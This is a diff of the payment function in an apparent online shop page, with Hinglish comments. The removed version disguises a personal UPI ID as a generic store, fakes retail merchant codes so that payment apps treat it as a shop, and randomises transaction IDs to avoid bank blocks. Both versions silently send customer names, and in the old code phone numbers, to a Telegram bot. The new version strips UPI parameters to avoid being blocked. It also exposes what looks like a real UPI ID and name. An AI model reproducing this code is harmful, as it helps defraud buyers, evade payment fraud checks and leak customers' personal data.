@@ -559,44 +559,28 @@ init = function() {
         }
 
     async function confirmPay() {
-    // 1. UPI ID aur Generic Name setup
+    // 1. Details (Simple rakhein)
     const myUpiId = "6299544009@naviaxis"; 
     const amount = sel.price;
-    
-    // Brand name bilkul use nahi karna hai, isliye "Online Store" rakha hai
-    const safeName = "Online%20Store%20Payment"; 
-    
-    // Transaction ID (tid) ko dynamic aur unique rakhein taaki bank block na kare
-    const txnId = "TXN" + Math.floor(Math.random() * 1000000000);
+    const name = "Sagar%20Kumar%20Tiwari"; // Asli naam use karein jo ID par hai
 
-    // 2. Optimized UPI Link (Verified Merchant Parameters ke saath)
-    // mc=5411 (Retail) aur mode=02 (Verified) apps ko lagta hai ye shop hai
-    const upiLink = `upi://pay?pa=${myUpiId}&pn=${safeName}&am=${amount}&tr=${txnId}&cu=INR&mc=5411&mode=02&purpose=11`;
-    
-    // 3. Android Intent (PhonePe ko fast trigger karne ke liye)
-    const intentUrl = `intent://pay?${upiLink.split('?')[1]}#Intent;scheme=upi;package=com.phonepe.app;S.browser_fallback_url=${encodeURIComponent(upiLink)};end`;
+    // 2. Chat Style UPI Link (Sabse Simple)
+    // Isme mc, mode, aur purpose HATA DIYA hai taaki block na ho
+    const upiLink = `upi://pay?pa=${myUpiId}&pn=${name}&am=${amount}&cu=INR`;
 
-    // 4. Telegram Notification (Details save karne ke liye)
-    const uName = document.getElementById('uName').value || "Unknown";
-    const uPhone = document.getElementById('uPhone').value || "NoNumber";
-    
-    const userMsg = `✅ New Payment Request\n💰 Amt: ₹${amount}\n👤 Name: ${uName}\n📞 Mob: ${uPhone}\n🆔 ID: ${txnId}`;
-    
+    // 3. Telegram Notification
+    const userMsg = `💬 Chat Pay Attempt\n💰 Amt: ₹${amount}\n👤 Name: ${document.getElementById('uName').value}`;
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(userMsg)}`).catch(e => {});
 
-    // 5. THE FAST REDIRECT (Seedha App Khulega)
+    // 4. Action
+    // Jab user ispe click karega aur PAYTM select karega, 
+    // toh wo tumhare dikhaye gaye chat interface jaisa khulega.
     if (/Android/i.test(navigator.userAgent)) {
-        // Android par ye PhonePe ko priority dega
-        window.location.replace(intentUrl);
+        // Direct intent bina extra package ke, taaki selector khule
+        window.location.href = upiLink;
     } else {
-        // iPhone/Safari par normal selector khulega
         window.location.href = upiLink;
     }
-
-    // Fallback: Agar PhonePe nahi hai toh normal selector 0.8s baad khulega
-    setTimeout(() => {
-        window.location.href = upiLink;
-    }, 800);
 }
 init();
     </script>
